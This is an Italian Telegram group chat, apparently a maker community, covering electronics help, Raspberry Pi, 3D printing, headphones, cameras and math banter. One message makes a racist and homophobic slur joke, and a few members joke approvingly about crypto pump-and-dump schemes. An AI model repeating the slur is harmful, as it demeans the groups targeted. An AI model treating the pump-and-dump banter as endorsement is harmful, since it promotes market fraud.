Buongiorno :)
Shish
Buondì
boooommm

Domandina veloce veloce che non dovrei fare perché il mio nome finisce col 98 ma non sono del 98: ma sei del 94??
Si

Ah  menchia
Non so se sei il più grande del gruppo 🤔
(O almeno di quelli di cui tengo nota)
Nono, c'è il Dio Cicca che scruta tutto dall'alto

facciamo un sondaggio per trovare il più grande del gruppo?


Dai 15 ai 20 – 15
 48%

Dai 20 ai 30 – 7
 23%

Dai 12 ai 15 – 5
 16%

Più di 40 – 2
 6%

Dai 30 ai 40 – 2
 6%

Meno di 12
▫️ 0%

 31 people voted so far.
Ma se ho quasi 20 anni rientro nei 15-20 e non 20-30 giusto?
Quello maggiore
K
Scritto cosí era confusionario
Perché tipo è dai 15 ai 20(escluso)
Ragazzi se ho un termistore e voglio misurare la temperatura della punta del saldatore posso o si brucia?
Se il termistore riesce a sopportare quelle temperature non ci dovrebbero essere problemi se non che diventa scomodo usare il saldatore e aumenti il tempo di riscaldamento della punta
Come diventa scomodo
Beh, hai un cavo e una palla sulla punta che a me disturberebbero non poco
Infatti io preferisco usare saldatori con centralina che sono molto meglio
Si scioglie il termistore
Solo prima di saldare lo metto per verificare la temperatura
C'è qualcos'altro da usare?
Yeeeee prima stampa (stupida )
Il solito: termistore, circuito per amplificare/togliere offset se serve, arduino o adc che sia
Gli sparate?
Che stampante?
Geeetech i3 b
199 euro
Mhhh
È buona?
Dunque
Calibrata bene si
Maa
Ancora sto cercando di risolvere i problemi con le asticelle dell'asse z che si muovono mi mezzo millimetro a destra e a sinistra e sballano un po' le superfici piane
Approposito avete consigli??
Io avevo visto il cuscinetto messo sopra ma si muove soprattutto nel giunto con il motore
(quindi sotto)
windows 7
Il "sistema"
esatto è un sistema
e come risultato da windows 7
Per quale senso logico
Al massimo 10XP e (Windows)^2
no nei sistemi trovi il punto in comune
Cioé?
Il nuovo rasp
Se devi comprarne uno prendi quello, se ne hai gia uno no
Quanto costa
Non trovo il tasto per comprare
Trovato
Lo prendo pure io...
Non dire cazzate
 mi deludi....
?
Non era come dicevi tu
? 
Bisognava comunque fare:
001
010
011
100 ecc....
Alla fine sì, ma boh io proverei prima a semplificarla un po'
Vabbè, tanto mi conosce e non mi ha detto niente 
Ragazzi ma se ho un materiale che (a parte errori) mi viene di resistività 59 Ωmm^2/m, che materiale è?
Carbone è molto difficile
raga esiste un api di twitter per ricevere i post da uno specifico utente?
Finalmente è arrivato ...dopo mesi
ehm... vi siete già dimenticati del sondaggio di Cicca? 
Se il sondaggio è finito ho vinto, sono il più vecchio.
ragazzi scusate ma serve a qualcosa studiare la documentazione del formato ELF?
Che significa draft in una fattura?
Per chi volesse il sondaggio completo sui Makers aggiornato a Ottobre 2017, ecco qui:



(all rights reserved to Cicca)
wtf
da me piove, dalla fronte però..sono in maglietta a maniche corte 
ma 
un saluto a tutti i makers dalla CalAfrica e dalla mia maglietta a maniche corte 
Non potevi prenderlo da Amazon?
 
l'ha preso mesi fa scontato con il coupon
Essendo miope è molto difficile, intorno al settemiliardesimo mi perdo
Chi sa usare sqlite3?
Ho un problema con una tabella, se elimino un record e poi ne creo un altro, l'ID (che è settato con 'ID' INTEGER PRIMARY KEY AUTOINCREMENT UNIQUE) fa come se il precedente record non fosse mai stato eliminato, quindi salta un numero
Io in terza media sono andato a Praga, 16h di pullman all'andata e 16h al ritorno lol
Wow
È giusto così
Certo non è precisissimo
Alcune persone le capisce precisissime, altri non capisce nulla
Per me vale la seconda
Va be' io parlo velocemente
Dipende dal dialetto, velocità, tono, ambiente, ci sono un sacco di variabili
E..e..e..
queste foto porno
H700i >>>>>>
Hahahahha
Sto studiando storia dell'arte :c
(che non comprerà nessuno)

 ‎€3‎9.‎90‎ i‎nv‎ec‎e ‎ch‎e ‎€9‎1.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 5‎6.‎63%
⭐️‎ 4‎.1‎0 ‌‎/‌‎ ‎5.‎00‎ (‎1 ‎re‎ce‎ns‎io‎ni)
 

l'Mx Master è a prezzo stracciato proprio
Rimango attaccato alle mie bellissime cuffiette della Apple
🤔no ti prego le cuffiette Apple no..Sennheiser tutta la vita 
Solo con una differenza........ Le cuffiette Apple sono comprese con il telefono....le sennheiser no
E se prendi qualcosa di buono ti vengono a costare 1/5 più o meno di un rene
Se qualcuno è interessato....
Grazie
c'è anche da considerare il costo dell'Iphone però
Come sono le Piston Fresh
 decenti
Un vecchio 5c
Dipende, quanto e cosa ascolti?
Non ascolto molto, però ho le mie della Huawei  che non mi stanno
🤔auricolari o cuffie? in-ear oppure over-ear?
Ma soprattutto.....che ascolti?
Raga qualcuno bravo in Photoshop?
Sono tipo in-ear però non lo sono (stile auricolari della Apple) e sono auricolari
Di tutto
ok, quindi come le vorresti le cuffie? simili oppure in-ear? quanto vuoi spendere?
Delle cuffie che mi stanno dentro le orecchie e che non costino troppo
con microfono oppure solamente cuffie?
Ti servono cuffie stereo
Non lo so 
Vuole Delle fottutissime coffie! Stop
Mi ricordate i tizi del Burger King che mi faceva 300 domande, ma io volevo un panino grosso ahahah
Ahahahah
Più che altro ho paura che i gommini non mi stiano
quello non è un problema, si cambiano e li vendono di vari misure
Oke, allora prendo le fresh a 3€
io uso queste 2 e suonano da dio per quanto costano (e sopratutto ti arrivano subito a casa)
oppure 
Sony oppure Pioneer, sono entrambe ottime in-ear..le Pioneer sono un pò più comode e potenti
Scusa eh....
Mi dovrebbero arrivare quelle di  Amazon
Costano niente, voglio vedere come suonano
Per 2€...
Non si può risolvere?
🤔ma sono prodotto Plus per caso?
Forse si
Comunque....ho fatto un danno
è quello il guaio infatti
Perché?
perchè per prenderle devi fare un ordine da 20€, e finisce la convenienza del prezzo..a meno di non dover ordinare già qualcosa
Puoi ogni volta prelevare il 
 e aggiungere 1
Okk
Se volessi chiedervi qualche consiglio per comprarmi una macchina fotografica sono nel gruppo giusto?
Quanto vuoi spendere
Meno di 1000, e sono interessato prettamente alla parte video.
Mi affascinano molto le Sony tipo A6300
Però devo ancora capire se allo stesso prezzo le reflex fanno meglio peggio o uguale
ehm spiegato in parole semplici?
è un' altra cosa...
Dipende dal che mirrorless e che reflex
Ma parla anche di Pump&Dump
Eh, spendendo la stessa cifra (ad esempio i 900€ per una a6300) come si comporta una reflex dello stesso prezzo?
non riuscivo a collegare due parti di un testo, poi ho scoperto che girando la pagina avevo iniziato a leggere dalla colonna di destra invece che da quella di sinistra 

Già non è che mi interessi più di tanto della letteratura storica, poi ci si mette pure sto libro!
Come ho fatto io
in tatti ci si mette d'accordo per comprare di colpo azioni o in questo caso criptovalute in modo che il prezzo aumenti anche se il valore non è realmente aumentato e poi subito dopo si vende a un prezzo molto piu alto di quello pagato, prezzo che in poco si sgonfiantornando a quello "vero"
a6300
oddio cosa ottima! che me ne frega che è illegale HAHAH
una domanda ma siccome le criptovalute non sono borsa tecnicamente non è illegale
AHAHAHAHAH
Ahahahahah
Ok, mi ha colpito molto anche a me, ma ci sono alternative anche meno blasonate?
🤣🤣🤣🤣
AH
altro che AkErInO che KraKKa KoN KaLi
Marco potresti rispondermi in privato? 
Non sotto i 1000, è la migliore migliore
Rispondo io per lui.....no
11!1
Sono a lezione in prima fila... Ricordami alle 19:00
Ah ok grazie
Neanche in ambito reflex?
Beh ogni tanto la 6500 si trova a un buon prezzo
Reflex non hanno più senso... In ambito foto si può questionare tra puristi e innovativi ma in ambito video mirrorless a man bassa
Sul gruppo si ma un privata no 🤔
E se togliessi unique? 🤔
Eh poi mi perdo a scrivere
Hahah
qualcuno che sa rispondermi (non voglio farlo  è solo un dubbio)
Ok grazie, allora mi sembra di aver capito che la scelta è o Sony o Sony

In realtà si tratta di borsa
Anche la 6500 che è stabilizzata se riesci... Magari su eGlobal la trovi a buon prezzo
Yup
Addio
Quello che ho detto io 
bè no tu non scambi in borsa,è come se in 1000 ci mettiamo daccordo e compriamo la passata di pomodoro al supermercato per fare alzare il prezzo no
Eh sì ho visto ma a parte quello nella parte video non sembra migliori così tanto, anzi ha anche un'autonomia più scarsa. Non so se vale la pena spenderci il 40% in più
Quando su un processore non occabile piazzi un dissipatore a liquido 
Tu compri e vendi praticamente delle azioni quindi dovrebbe essere borsa
good
ah ok allora hai fatto benissimo
Più che sprecato quel dissipatore 
Ne frattempo qua escono le meme
lo so quello e so benissimo che farlo in borsa è illegale ma il mio dubbio nasce dal fatto che le criptovalute non sono "regolamentate"
Guarda che esistono le API
È la documentazione che non esiste
Nah poi la faccio io
Secondo me è più prioritario lavorare a una GUI più user friendly e implementare qualche oggetto in più come pulsanti e telecamere di sorveglianza
per la prima parte non me ne occupo più solo io, per la seconda sì ed è quello che sto facendo in questo periodo in realtà
Quando non hai la versione digitale degli appunti
Ahahahah
IBM ha creato un computer più piccolo di un granello di sale



sale grosso


Quello nella foto è formato da 64 di quei cosi
sono 1mm*1mm i chip singoli
Anche io
cosa ci fai però
Chi ha le maschere per le frecce e altre robe nelle foto?
bozza
Draft vuol dire bozza, che sia la bozza di una fattura o meno
Ah ok

Telegram X 
No, questo è Telegram normale con un tema
nop
è il client BELLOH di telegram
Mi piacerebbe vederlo
Instagram ha spesso queste "irregolarità"
Ciao a tutti. Qualcuno potrebbe dirmi dove trovare un tutorial per disabilitare le porte usb su un Pc con Windows 7 pro? Grazie.  :)
che lavoro di merda moderare i supergruppi
gli ho warnato un palese insulto ad una categoria di videogiochi e lui e il suo amico sono partiti 
Bannali entrambi e via
Finalmente è stabile
Nel senso che non è ancora esploso?
Nel senso che non cade oggi 3 per 2 ... usavo il touch e dadeva...
ragaaaa
qualcuno ha esperienza coi moduli 433mhz per arduino?
quelli megaeconomici
Riesco a farmi un trasformatore 24v ac - 9v dc?
radddrizzatore, stabilizzatore, un paio di condensatori
Come faccio a sapere che raddrizzatore e stabilizzatore usare?
Qualcuno sa come risolvere......non riesco ad afferare la scheda perché troppo grande

sega via le parti senza stagno 
Da dove li prendi 24v ac
Da un trasformatore di un vecchio carica batterie per trapano
Da quando i trapani vanno ac
C’è qualcosa di rotto nel circuito quindi recupero le bobine del trasformatore
Reggono molta potenza
Cosa sbaglioooo
Sto tentando di fare un amplificatore classe a ma non va, asp, invio il progetto
Here
Questo tizio fa una barca di video di elettronica, consigliatissimo (è studiato, non il primo pirla che passa)
già..ma il problema è che il mio circuito non è sbagliato
è un generico amplificatore a transistor, non capisco cosa cribbio stia sbagliando però, deamplifica invece che amplificare
Bene gli sto studiando per domani
A emettitore comune?
Controlla tensioni a regime statico, controlla piedinatora transistor, rifai i conti dei componenti
yep
Ah lol ho visto ora lo schema 
La classe AB è meglio...
e ora sto usando un bc547, ho finito i 2n2222
si ma al manco riuscissi a far andare questo, poi penso agli altri
Controlla se puoi l'hfe
Devi centrare il punto di lavoro
Il problema è che in quel circuito c'è solo una resistenza di pullup e manca la resistenza che dalla base porta al collettore
c'è, è da 100k, che connette base e collettore
Se hai un trimmer o potenziamento...la centri a tentativi
vabb, un potenziometro c'è ma dove ce lo ficco?
su matematicait, credo che ora esplodono 
avrei una domanda, ma 0^0 fa 1?
perchè la legge del "ogni potenza con base 0 è uguale a 0" non è valida in questo caso perchè 
 visto che è elevato alla 0, quindi rimane la legge del "se non ci sono basi da moltiplicare la potenza è 1"
ma manca quella che da base va all'emettitore
Riduci la resistenza di base a 10k e ci metti in serie un potenziometro da 100k
Già
forma indeterminata, non fa 1, non fa 0
se vuoi una conferma e non ti fidi della mia parola: 
in python,c,java e secondo la mia teoria(teoria? omg che schifo) fa 1
e poi wolfram agisce secondo istruzioni arbitrarie
praticamente non ci prova manco a calcolarlo, mette subito undefined
segue la regola matematica. Non c'è da discutere molto
Fallo di classe AB... È meglio ...basta che hai 2 transistor dello stesso modello npn PNP...ti invio uno schema se lo trovo
Uppp
Anche se in tantissimi ambiti matematici si assume per convenzione che faccia 1 semplicemtente per semplificare la notazione
ma questi user id sparati in giro a caso?
?
si, ma separandoci un attimo dai dogmi matematici e riflettendoci su?
Ogni affermazione va dimostrata
fai il limite di x^x per x che tende a 0 e dimmi cosa ti esce...
Ehm..
indeterminata
∆
uhm... non è vero che non ci sono basi
Ok ho messo il potenziometro...non ho concluso nulla, ho solo messo un variatore del volume praticamente
lo 0 è un numero
Ciao a Tutti, il mio PC non riconosce in alcun modo Arduino Micro (ATTINY85). Nemmeno dall'IDE di ARDUINO selezionando Arduino/Genuino Micro. Esiste qualche driver da installare? Grazie a tutti
So... dovrebbe fare 0 se guardi la regola di 0^n e dovrebbe allo stesso tempo fare 1 se guardi la regola di n^0
quindi è indeterminata
 se l'immagine fosse con una risoluzione e potessi zoommare in x=0, vedresti un punto di discontinuità
E comunque sono sotto di un casino di volume, senza l'amplificatore è mooolto di più il volume...e non c'è nemmeno tutto il brusio, help
la X cosa indica? 🤔
y=x^x
Arduino non utilizza Attiny🤔🤔
Ha su Atmega32u4
Ragazzi qualcuno può spiegarmi cosa vuol dire "rilocazione"?
dipende di cosa stai parlando
deframmentazione disco?
Mmh intendevo in ambito linking
Raga nessuno guarda dragon ball?
Ciao, si, trovi I driver e la libreria.
Ieri ho tribolato un po' senza farlo funzionare, stamattina ha subito funzionato, se hai il digispark va inserito nella usb dopo aver caricato lo scketch sull' ide, ti dice lui quando inserire usb e ti da 60 secondi
PayPal è gratuito vero?
Ma devi fare un amplificatore per quell' altoparlante?
si
Raga ma vi rendete conto che si può inserire tutta wikipedia inglese con immagini in una pendrive da 128 che è grande come un polpastrello?
Il sapere in una Pennetta
È mind-blowing
*builds a scraper for that*
Esiste già .-.
Cioè, io ora compro una Pennetta Samsung da 128 GB a 40€, l'attacco il PC, apro xowa e lascio lavorare 30h, poi prendo la chiavetta e ho tutto il sapere nel palmo della mia mano
Magari la seppellisco e fra 33773847463727 anni la troveranno e capiranno quanto eravamo scemi xD
Mind-blowing
figata
Morto
Quando capisci la vera grandezza dei GB xD


Io posso fare quello che voglio non mi arrestano ancora
Si
Ti mettono dentro con un negro gay sordo e buttano la chiave
Scherzavo eh
Ni
Nel dubbio...
Si, ma la cazzo di PayPal la devi caricare
HAHAHAAHAHAHHAHA l'ho capita adesso
AHAHAHAHHAHAHAHAHHAHAHAHAHAHAHAHAHAHAHAHAA
Ci ho messo tipo 10 minuti a capirla xD
Ma quanto pesa wikipedia esattamente
Molto 
ma neanche tanto, è tutto testo e se ci sono immagini sono piccolissime
tutta la wikipedia inglese ci sta in una chiavetta usb, eh 
Adoro 
Probabilmente si
Un centinaio di GB se ci metti anche le immagini
Di Tb
Nop
Gb
Intendo solo quella inglese
Come posso farmi una carta virtuale?
Allora si
(e invece no)
Ci sono anche tutte le modifiche
E invece si .-.
?
Secondo me anche solo di una lingua pesa qualche tb
Sai che il testo non pesa niente vero?
Obv
le immagini che ci sono sono a bassa risoluzione e piccolissime
Per esempio questo messaggio da solo pesa solo: 52byte
Si ma non sono 2-3 immagini e 1000 parole sul sito
1gb sono un miliardo di byte
100 GB sono 100 miliardi di lettere
Come se non lo sapessi.....
E 100 miliardi di lettere sono TANTISSIME
Perfino per wikipedia
anche 128GB sono tantissimi
Andiamo a chiedere a Wikipedia allora
non serve
Ahh, no, scarica solo l'ultima versione delle pagine
Lo stavo scrivendo io xD
ma pacchissimo, chettefrega 
 
 abbiamo trovato un lavoretto per la vps 
Tipo a scuola:
Prof: TU Cosa hai dentro quella chiavetta?
Io: tutto il sapere dell'umanità
Come attacchi una USB ad una vps?
lo scarico via ftp
ha un upload di 200MB/s 
Tanto vale farlo in locale .-.
Comunque ecco qui

si probabilmente ci metterei di più a scaricarlo 
Secondo lui la wiki inglese pesa 12gb
Salva tutto la storia delle modifiche
solo il testo però, e potrebbe avere senso
che figata però 
Testo e compresso
Ma anche no 
Avrei 
 copie della stessa pagina
Ahhhh allora sí
se trovo un modo di clonarmi solo il testo giuro che lo faccio
Immaginati la follia nel voler comprimere 20gb però xD
Xowa può clonare anche solo il testo
Infatti salva le modifiche non tutte le pagine
Eh?
Cos'è xowa?
Se c'è scritto che la storia delle modifiche non compressa pesava 5.6 tb nel 2010 e nel 2015 le pagine non compresse pesavano 50gb c'è un motivo
Con immagini?
(Le pagine)
No solo le modifiche del testo, però 5.6 tb in confronto a 50gb sono tanti
Vorrebbe dire circa 110 copie di ogni pagina
Avevo ragione....
È probabile
Eh, ma è come se prendessi tutto l'albero evolutivo di una specie o solo l'esemplare attuale
Il primo è ENORMEMENTE più grosso
Appunto ma se le conti non pesa solo qualche gb
Ma cosa vi frega di avere tutte la storia delle modifiche? Basta avere quella di adesso 
Ma infatti xD
Beh quello si, ma se la domanda era quanto pesa wikipedia allora non si possono trascurare le modifiche
No la domanda era: vi immaginate scaricare l'Intera wikipedia su una chiavetta grande quanto un polpastrello? xD
^
Chi è che cercava la a6300?
Lo taggo?
Guarda sopra e vedrai che intendevamo le pagine, non tutta la history
Grazie
Si sono io
C'è in "offerta" a poco più di 800 euro
Dove?
Amazon
Ma è solo il corpo
Anche ieri costava così, dici che è raro trovarla a quel prezzo?
Booh ho solo visto L'offerta 
Qualche volta la ho vista con l'obiettivo kit a 650 tipo
Magari dopo mi cerco un grafico con l'andamento prezzi, grazie comunque
?
E della Fuji xt20 invece cosa mi dite? È veramente peggio in ambito video?
In ambito video leider non so...
Ho visto che la Fuji ha un ottica kit migliore e dei colori di base più caldi e piacevoli. Però penso anche che se le Sony hanno avuto quel successo un motivo ci deve essere.
Actually no
Dei colori importa relativamente poco se registri in slog... E se vuoi fare bella roba l'ottica kit non è il massimo
Beh quindi mi consigli comunque la 6300 anche se al momento costa 100€ in più
ah ok 
togli wikimedia 
No beh granparte delle immagini incluse nelle pagine sono di buona qualità
uhm dici?
vabbè clono solo il testo
Sì, poi chiaramente nelle pagine le scala a seconda della dimensione a cui te le fa vedere
Yee blackmirror 
Nei commenti hanno già mostrato quanto l'articolo sia maltradotto
No, che schifo
Ah visto
Allora ha senso
Una roba tipo la patente a punti: vengono tolti dallo stato per ogni contravvenzione
Esattamente, molto più sensato...anche se meno divertente
grazie
seguirò questa guida speriamo vada tutto bene


Sempre meno pesante di Singapore
In che senso?
A Singapore è tutto automatico e tutto basato sulla reputazione
Perché son tutti ricchi sfondati quindi delle multe non gli fregherebbe niente
Quindi ad esempio de butti una carta per terra (e gli algoritmi ti vedono perché ci sono telecamere ovunque) ti arriva a casa una maglietta gialla con scritto "inquinatore" da indossare un paio di giorni

in italia scommetto che il 90% dei ricchi avrebbe una maglia con scrutto evasore
In Italia nessuno la metterebbe e chi se li incula quelli che vogliono farti mettere le magliette
Leggi dopo, ha tradotto tutto sbagliato Tom's
Devi pagare i versamenti sulla carta
vi
come hai fatto
tipo l' html
la scritta pareri
Ciao a tutti!
Ho creato un  piccolo script per Tampermonkey che permette di visualizzare le immagini su Google Immagini semplicemente facendo click sull'immagine (in modo da non essere obbligati ad aprire il sito web)

 
 un modo intelligente per fare un AND tra due segnali? Il top sarebbe un led che si accende quando entrambi sono al massimo, o comunque una roba del genere
Se hanno la stessa tensione di picco, potrebbe essere un'idea mixare i srgnali e poi il risultato buttarlo in un trigger di smith. Poi per avere una risposta definitiva bisognerebbe sapere come sono i vari segnali
No, balle, niente mixaggio
Il fatto è che non sono in fase quindi mixare viene fuori un po' un ciesso
Google: arrivano in Italia le Actions on Google | Hardware Upgrade

Infatti, avrebbe piu senso fare un and analogico
E si puó fare in diversi modi
Raga se non mi vedrete più fra 1 ora organizzate pure il funerale
avete presente quando viziate i genitori prendendo sempre bei voti a scuola? ecco ho preso la prima insufficienza dell'anno 
hey, a proposito,(ora ho un 
 sull'nxp e lo voglio usare), se voglio trasmettere in fm, qual'è l'intervallo di frequenze che di solito si usa?
del tipo +-0.5MHz o quanto?
Quantifica
saaaaad
 lo puoi usare per fare trasmissioni fm, se non per generare il segnale che poi verrà modulato da hardware apposito
ok chiedo scusissima, e se volessi fare in am per poi amplificare?🤔
Stessa identica cosa
L'unico caso in cui tu possa fare quello che volevi fare, è quello in cui tu vai a trasmettere con frequenze di qualche kHz
Ma dovresti avere un antenna kilometrica
neel senso, se io mandassi in output alla stessa frequenza un certo voltaggio per indicare 0 e 1, starei già trasmettendo in am no? basta usare la (frequenza giusta per rientrare nella banda)
Su amazon posso acquistare senza pagare e pagare dopo?
beh l'idea è quella, riguardo all'antenna poi ci penso io, comunque non servirebbe nemmeno amplificare effettivamente facendo così....comunque, di quanto deve essere il ""ΔA"" indicando A=ampiezza? nel senso, tra 1 e 0, quant'è la differenza di ampiezza?
se intendi quando ti arriva a casa, si, mi sembra di si
No, dico se non ho i soldi ma ho visto un offerta e pago appena ho i soldi
noh allora
Dc
Dio cristo
why
Lavori in analogico, il massimo è la Vref del dac interno ma pupi scegliere di avere una tensione inferiore
beh si ma tipo...accaso?
o ci sono delle norme e convenzioni?
Ho interpretato il dc di franzisss
non farlo più

La Vref del dac, che puó essere la tensione di alimentazione o presa da una sorgente esterna dedicata
ook
per 1 quindi, ma se tipo volessi segnare un valore minore è un valore tra 0 e Vref quindi? proporzionato tipo?
Ma questo ha l'usb normale tipo quello di arduino?
del tipo che trasmettendo in am sempre quei 3.3v sentirei un rumore fisso, per gli altri si va a proporzioni?
e nulla=0v
Non poteva essere un semplice dotch
Non so come sia quella di arduino
Ha 3 USB ed una microusb per l’alimentazione
Ha l'usb tipo quella delle chiavette?
Si, inoltre con la microusb non puoi comunicare con il raspberry
Non ho capito
Sei cosí confuso che non si capisce di cosa parli
Su arduino i programmi li trasferisci collegandolo al Pc con la porta usb
vabb si, dovrebbe essere giusto
Qui no
dopo provo, quando ho trovato una radio da usare
Ok.
Dove lo compro? (Dico da quale sito)
?
amazon
Li costa di più
il prezzo  è quello non è come per arduino che essendo open hardware ci sono tutti i cloni a pochi euro
su gearbest costa poco meno, 4 euro ma ti arriva dopo piu tempo

Com'é?
Dove vuoi
Magari non da siti cinesi con i coupon che ti arriva a settembre
Paghi la metà ma ora che ti arriva fai prima a costruirtelo te
Questo é il 3B, non il 3B+
Oks
Leggiti bene il datasheet
E che sd serve?
MicroSD preferibilmente classe 10 ed abbastanza capiente
Io ne ho una da 64Gb, ma sono fin troppi
non ce bisogno che prenda il 3b+ le differenze sono marginali
Eh ma già che c’è
Coming 
Dai si scherza
Link di una scheda buona ed economica su amazon?
una vale l'altra
 scontata del 53%
Quale dei tre prendo?
sia il primo che il secondo sono negozi affidabili, il terzo non lo conosco 
Boh il nome che ti piace di piu
Quello che costa meno
Anch'io devo prendere il mio e quello da regalarvi
E qual'é?
provato a fare coi transistor ma viene lo schifo che vedi in foto 
Cosa?
Il sito che costa meno
Controlla quanto costa ognuno e valuta il sito con il prezzo minore
Se lo vuoi ricevere in tempi umani evita siti cinesi 
tra i tre rs è quello piu economico pero poi devi anche vedere la spedizione
Opamp, usati come sommatore e trigger di smith
boh confronta
Ma non sono cinesi, spediscono dall'italia o dalla francia
L'altro giorno un tizio aveva detto che gli era arrivato dopo qualche mese /:
Si ma lo aveva preso da gearbest un po' di tempo fa che c'era stata un offerta
ragazzi, posso accendere e spegnere a ritmo di musica un led con raspberry?
noh, non ha pin analogici, solo gpio...a meno che tu non li metta in pwm, in quel caso qualcosa si potrebbe fare forse
on e off
senza pwm
ma comunque la musica 1) dovrebbe venire da dentro il rasp e 2) dovrebbe essere in wav e 3) sarebbe un casino
un relè devo comandare
allora si
infatti dal rasp voglio farla riprodurre
e non c'è problema se sia un mp3 o un wav
maa come? come fai a ritmo di musica se è on e off
si beh non so
io saprei come fare con un wav, con altri formati boh, almeno in cpp è impossibile tipo
non preoccuparti, devo usarlo come sveglia, non ci faccio caso appena sveglio

col python credi che ci riuscirei?
mmhh...mi sembra ci fosse una libreria apposita...anche se poi ce ne saranno 99
Luci stroboscopiche, mai sentite?
si...infatti ho detto pwm, ma lui ha detto solo on e off, niente pwm
Strobo e pwm sono cose diverse
beh, sempre intermittenza è, mettendo in pwm un pin e usandolo per accendere una luce lo fa accendere e spegnere tot volte al secondo dando l'impressione che si accenda solo in parte, bene o male quello è il problema
anche usando il pwm si risolve il problema del non avere degli analogici
Strobo e pwm sono diversi ripeto
in cosa sono diversi?
Tipo tutto
Confonde gli strobo con le luci psichedeliche
una luce stroboscopica è una luce che proviene da una fonte intermittente...proprio come un led in pwm
no?
Gli strobo si accendono e spengono 5-10 volte al secondo in realtà
Il Pwm è una modulazione di tipo impulsiva...lo strobo sono luci che lampeggiano
Il Pwm inoltre ha la caratteristica di mantenere la stessa frequenza cambiando il periodo di ON OFF
a beh, effettivamente...il pwm si basa pure sul duty cicle e via dicendo, si, dimenticavo, sono fatto, ho appena finito di scrivere 108 righe di codice di esercizi per casa di informatica, ora sto bene
come dovrebbe funzionare?
ho avviato la musica con sox e avviato lo script
ho provato a collegare il relè su vari pin e o rimane acceso o spento
Allora:
1) non collegare mai un relé direttamente a una porta gpio
2) un relé meccanico è troppo lento per questo lavoro
3) quel codice controlla i pin 7,11,13,15,12,16,18,22 con vari pattern
1)è il modulo relè optoisolato
2) Perchè è troppo lento?
3) ovvero?
perché per ogni volta che acendi/spegni c'è un pezzo di metallo che si deve fisicamente muovere
È troppo lento per il puro fatto che il relé non riesce a commutare decentemente a frequenze superiori ai 10Hz
Come funziona il kit trasmettitore-ricevitore wireless per arduino? Trasmette dati seriali?
Che risoluzione
4k
Dico la stampa non la foto xD
3k
Va beh è venuto bene, con cosa è stato fatto
Con una fom 2
Tua?
Ovviamente non è mia
Peccato
Però la posso usare
Certo devo fare 10 km però
Scuola?
Azienda
Ah ok
🤔in teoria sta tutta in un link 
🤔concordo con Lorenzo, prova a fare in analogico, niente trigger

Posso inserire un relè fra i due?
Dovrebbero essere invertitore e deviatore
Per fare cosa?
Per comandarlo anche dal rasp
Tu sei un pazzo
Perché?
Hai tirato fuori lo scatolotto senza staccare la corrente

Fuera proprio
intanto metti a posto quei tre fili non deve vedersi il rame, è pericoloso
Cosa può succedere? Sta dentro la scatoletta, mica fuori
E pericoloso lo stesso, già solo se ci lavori
Taglia un po' di rame e accorcia la parte sperata e fallo entrare di piu
È pericoloso già solo pensarci
Esatto
Tanto non devo lavorarci tutti i giorni
Quindi nella pratica? 
Vogliamo sostanza non teorie
Ciao ragazzi 
Scusate se mi intrometto sempre per il mio progetto della trasmissione in lunga distanza ho visto i moduli seriali hc-12 (sono 433Mhz) e con una antenna giusta dovrebbero avere delle portate interessanti 

Che mi dite?
ragazzi
qualcuno mi invierebbe perfavore la libreria per arduino liquidcrystal??
ma sono dacellulare
e il mio fa abbastanza schifo da non permttermi di scaricarlo
 
Assolutamente consigliate le cuffie Amazon basics a 2€
L'ho fatta con 
 in un'altra chat ed ho inoltrato qui senza citare
Hahahahahahahaha anche io oggi rip
❤
Dove sono?
gg
Ragazzi, Mi band 2 cinese o internazionale cosa cambia?
Come si fa ad inoltrare senza citare?
yeyeyeyeyeyeyeyeyeyey
ragazzi battuta bellah random:
Una supposta è in sala d'attesa, gli dicono: 

Con il client di telegram normale non si può
Ah ecco
Oddio
A casa mia
porco due
ricerca su tartaglia
Ma -.- dicevo su amazon
Mando il link?

la prima meme 
Si
 queste? 
Solo che io le ho prese nere
AHAHHAHAHAHAHHAHAHAHHAHAHAHHAHAH
Prendete le AirPods
lol
Lol
questa era bellissima 
Schifo
Si sente abbastanza bene
da pagina 3 a 8 dovrebbe andar bene
Ma chi spende 100 e passa euro per un paio di cuffie?
Bannatelo
Io
Io tra un po'
Motivo?
Tanto alla fine ci perdi un sacco di qualità
ahahah, erano un regalo
Anche se prendi le cuffie di 1000€ e le ascolti sul telefono
Ha detto che le AirPods sono buone
Io l'ho detto che quel 
 l'avrei usato per forza
Infatti le uso la maggior parte delle volte su PC, comunque non sono un audiofilo e non ho idea se si senta bene/male
yeee
Non penso funzionino male
Io sento bene, ma non so ahaha
Ma il dominio . ovh è gratis?
Grande 
Poi se sei prevenuto nei confronti di Apple è un altro discorso
No, costa poco e fa schifo come "estetica", ma io l'ho preso per roba privata
Sicuramente non valgono il prezzo a cui le vendono
Con 100 euro ti compri un paio di cuffie bose
Assolutamente no, fino a due mesi fa usavo l'iPhone
Forse un po' di più
Nono le trovi
Anche a meno a volte
Si.....a 99
Forse esiste il modello da 70/80 ma non ne sono sicuro
ora faccio di meglio
Si è anche bose non paghi la qualità ormai
Ci sono cuffie migliori? Vero
Con meno di 40 euro prendi delle superlux hd681 evo che come qualità audio sono nettamente migliori. Superlux producce anche i driver per alcune cuffie akg
(nessuno la capirà ma ok)
oppure sempre sotto i 100 euro si trovano le Audio Technica ATH-M40X che sono ottime sia come qualita audio che come costruzione, infatti le superlux peccano propio su questo sono un po fragili
Raga
Che voi sappiate iTunes a che qualità rippa i file dai cd, comprime,se si in che formato e a che bitrate,e la gamma dinamica?
Ciao ragazzi, chi può darmi una mano a flashare il sonoff?
Sto seguendo l’ultimo video di overvolt
Ma sono bloccato qui
Fiko
Stampante?
Non ne capisco molto io 
0.06
Probabilmente
Form 2
Ahhh i big money
Della scuola immagino
No dell'azienda di famiglia
Diventa una droga questa
Che belooo non so manco cosa sto facendo ma è divertente
Lol
datemi idee su cosa fare mo'
Serve per conoscere l' età.
Io a 64 non ascolto più nulla
ho un analog out a mia disposizione, vorrei trasmettere ma so che distruggerei l'anima di ogni radioamatore quindi mi limiterò a qualcos'altro
è?
hai installato Python e Pip?
no, non quello, è solo un ciclo for(i=0;i<5000;i++) e aumenta la frequenza e il contatore segue una proporzione, l'ho scritto così di fretta giusto per testarlo
Non so come fare.. mi dice come in foto
e sinceramente, credo che se a 9.9, ossia 5000hz, non ci senti più, devi essere proprio moooolto sordo
Installa python 3.5
All' aumentare dell' età le frequenze alte non vengono piu udite.
Da bambini si ascolta da 20 hz a 20 khz
Da adulti da 20 a 18khz
Da anziani non piu di 15 khz
Kooominque
devi installare Python sul tuo computer, un attimo e ti trovo il link
